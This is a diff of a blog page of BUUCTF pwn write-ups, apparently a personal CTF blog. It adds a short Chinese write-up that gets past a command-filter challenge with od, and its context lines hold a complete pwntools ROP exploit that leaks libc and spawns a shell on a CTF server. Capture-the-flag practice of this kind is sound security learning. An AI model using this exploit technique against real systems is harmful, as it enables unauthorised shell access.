@@ -145,8 +145,13 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/mian.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/gadget.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/format.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/ssh.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/test-1598684248502.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/c.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/cmd.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag-1598684957739.png">
 <meta property="article:published_time" content="2020-07-20T01:15:56.000Z">
-<meta property="article:modified_time" content="2020-08-28T07:00:19.951Z">
+<meta property="article:modified_time" content="2020-08-29T07:09:46.756Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/buu/2.png">
@@ -579,6 +584,21 @@
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./babyrop2')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28809</span>)</span><br><span class="line">elf=ELF(<span class="string">'./babyrop2'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400733</span></span><br><span class="line">pop2=<span class="number">0x0000000000400731</span></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">format_str=<span class="number">0x400770</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop2)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<h2 id="9-BJDCTF-2nd-test"><a href="#9-BJDCTF-2nd-test" class="headerlink" title="#9 [BJDCTF 2nd]test"></a>#9 [BJDCTF 2nd]test</h2><p>使用ssh连接</p>
+<p><img src="/image/buu/ssh.png" alt="ssh"></p>
+<p>ls看到有flag、test、test.c</p>
+<p><img src="/image/buu/test-1598684248502.png" alt="test"></p>
+<p>cat flag权限不足</p>
+<p>查看test.c</p>
+<p><img src="/image/buu/c.png" alt="c"></p>
+<p>有一个system函数执行cmd。过滤了一系列字符。</p>
+<p>查看还可以用的命令</p>
+<p>ls /usr/bin/ /bin/ | grep -v -E “n|e|p|b|u|s|h|i|f|l|a|g”<img src="/image/buu/cmd.png" alt="cmd"></p>
+<p>-v 是反取，-E是执行多个条件，查看/usr/bin目录下</p>
+<p>可以执行od和x86_64</p>
+<p>x86_64貌似是非预期</p>
+<p><img src="/image/buu/flag-1598684957739.png" alt="flag"></p>
+<p>od则是返回flag的8进制</p>
 
       
     </div>
@@ -696,7 +716,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -733,7 +753,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-bjdctf-2020-babyrop2"><span class="nav-text">#1 bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ciscn-2019-n-3"><span class="nav-text">#2 ciscn_2019_n_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ciscn-2019-es-2"><span class="nav-text">#3 ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-zjctf-login"><span class="nav-text">#4 zjctf_login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-zjctf-easyheap"><span class="nav-text">#5 zjctf_easyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-babyheap-0ctf-2017"><span class="nav-text">#6 babyheap_0ctf_2017</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-ciscn-2019-s-3"><span class="nav-text">#7 ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-HarekazeCTF2019-baby-rop2"><span class="nav-text">#8 [HarekazeCTF2019]baby_rop2</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-bjdctf-2020-babyrop2"><span class="nav-text">#1 bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ciscn-2019-n-3"><span class="nav-text">#2 ciscn_2019_n_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ciscn-2019-es-2"><span class="nav-text">#3 ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-zjctf-login"><span class="nav-text">#4 zjctf_login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-zjctf-easyheap"><span class="nav-text">#5 zjctf_easyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-babyheap-0ctf-2017"><span class="nav-text">#6 babyheap_0ctf_2017</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-ciscn-2019-s-3"><span class="nav-text">#7 ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-HarekazeCTF2019-baby-rop2"><span class="nav-text">#8 [HarekazeCTF2019]baby_rop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-BJDCTF-2nd-test"><span class="nav-text">#9 [BJDCTF 2nd]test</span></a></li></ol></div>
             
 
           </div>
